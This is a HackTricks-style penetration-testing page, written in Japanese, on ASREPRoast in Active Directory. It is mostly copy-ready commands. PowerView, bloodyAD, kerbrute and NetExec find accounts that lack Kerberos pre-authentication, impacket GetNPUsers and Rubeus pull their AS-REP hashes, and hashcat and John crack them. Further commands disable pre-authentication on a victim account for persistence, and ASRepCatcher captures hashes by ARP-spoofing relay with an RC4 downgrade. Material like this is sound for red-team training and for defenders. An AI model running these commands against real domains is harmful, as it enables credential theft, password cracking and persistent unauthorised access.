# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast は、**Kerberos pre-authentication required attribute** を持たないユーザーを悪用するセキュリティ攻撃です。要するに、この脆弱性により、攻撃者はユーザーのパスワードを必要とせずに Domain Controller (DC) へユーザーの認証を要求できます。すると DC は、ユーザーのパスワードから導出されたキーで暗号化されたメッセージを返し、攻撃者はそれを offline で crack してユーザーのパスワードを見つけることができます。

この攻撃に必要な主な条件は次のとおりです:

- **Kerberos pre-authentication がないこと**: 対象ユーザーでこのセキュリティ機能が有効になっていない必要があります。
- **Domain Controller (DC) への接続**: 攻撃者は要求を送信し、暗号化されたメッセージを受け取るために DC へアクセスできる必要があります。
- **任意の domain account**: domain account があると、LDAP queries を通じて脆弱なユーザーをより効率的に特定できます。そうしたアカウントがない場合、攻撃者は username を推測する必要があります。

#### 脆弱なユーザーの列挙（domain credentials が必要）
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS_REP メッセージの要求
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus はデフォルトで **RC4** を要求するため、Event ID **4768** では通常 **preauth type 0** と **ticket encryption type 0x17** が表示されます。**`/aes`** を付けると、または対象で RC4 が無効化されている場合は、代わりに **AES etypes** が表示されると考えてください。

#### Quick one-liners (Linux)

- まず、Kerberos userenum で潜在的な対象を列挙します（例: leak された build paths から）: `kerbrute userenum users.txt -d domain --dc dc.domain`
- 有効な認証情報なしで username list 全体を roast するには NetExec を使います: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`
- もし認証情報を持っているなら、NetExec に LDAP を query させて roast 可能なアカウントをすべて request させます: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`
- 出力が **`$krb5asrep$23$`** で始まる場合は、Hashcat **`-m 18200`** で crack します。**`$krb5asrep$17$`** または **`$krb5asrep$18$`** で始まる場合は、John **`--format=krb5asrep`** を使うのが適切です。

### Cracking

すべての AS-REP roast が RC4 だと決めつけないでください。最近の tooling は、要求された/ネゴシエートされた enctype に応じて **RC4** (`$krb5asrep$23$`) または **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) を返せます。**`hashcat -m 18200`** は **etype 23** 用で、**John** は **17/18/23** に対して `krb5asrep` を直接扱えます。
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### 永続化

**GenericAll** 権限（またはプロパティを書き込む権限）を持つユーザーに対して、**preauth** を不要に強制する:
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast without credentials

攻撃者は man-in-the-middle の位置を利用して、Kerberos の pre-authentication が無効化されていることに依存せず、ネットワークを通過する AS-REP パケットをキャプチャできます。したがって、VLAN 上のすべてのユーザーに対して機能します。\
**service ticket** ではなく **TGT** を no-preauth principal から返す関連する no-credential の手法が必要な場合は、[Kerberoast](kerberoast.md) を参照してください。

[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) を使うことでこれを実現できます。攻撃の観点では `relay` モードが興味深いです。クライアントがまだ **etype 23** を広告している場合に **RC4** を強制できるからです。`listen` は受動的に動作し、クライアント/DC がネゴシエートした内容をそのままキャプチャするだけです。
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
